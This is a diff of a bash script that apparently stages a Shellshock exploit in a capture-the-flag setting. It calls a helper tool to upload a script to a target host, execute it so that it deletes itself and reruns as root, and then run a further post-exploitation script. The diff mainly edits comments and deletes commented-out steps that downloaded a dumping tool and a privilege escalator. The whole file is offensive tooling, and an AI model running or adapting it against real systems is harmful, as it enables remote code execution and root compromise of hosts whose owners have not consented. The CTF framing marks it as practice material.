@@ -1,6 +1,7 @@
 #!/bin/bash
-
+# ctf stager for shellshock exploit (running one command at a time is too slow)
 # define the host to attack
+# ties into the ctf_sploiting script
 
 PAUSE=6		# it is the shortest time to wait for connection to die
 STAMP=`date +%H-%M`
@@ -19,8 +20,9 @@ function code_execute_via_shellshock {
 	# grab the script
 	./ctf_sploiting.py -m SR -t get_script -s exp.sh -i $1
 
-	sleep 7	# try not to step on your own dick
+	sleep 7		# first socket drops and timeouts
 
+	# the timing out kills it at this point
 	./ctf_sploiting.py -m SR -t custom -c "echo " -i $1
 	# execute the script default ( it removes itself and reruns as root
 	
@@ -29,14 +31,6 @@ function code_execute_via_shellshock {
 	./ctf_sploiting.py -m SR -t first_script -s exp.sh -i $1
 
 	sleep $PAUSE
-
-	# execute the POST script ( which is the same as exp.sh but with root )
-	# download the tools as root
-	# -g from the script downloads dump.sh & priv_escalator
-	#./ctf_sploiting.py -m SR -t script_opt -a "-g" -i $HOST
-	#./ctf_sploiting.py -m SR -t post_script -s post.sh -i $HOST
-	
-	#sleep $PAUSE
 
 	./ctf_sploiting.py -m SR -t post_script -s cmnd.sh -i $1	
 }
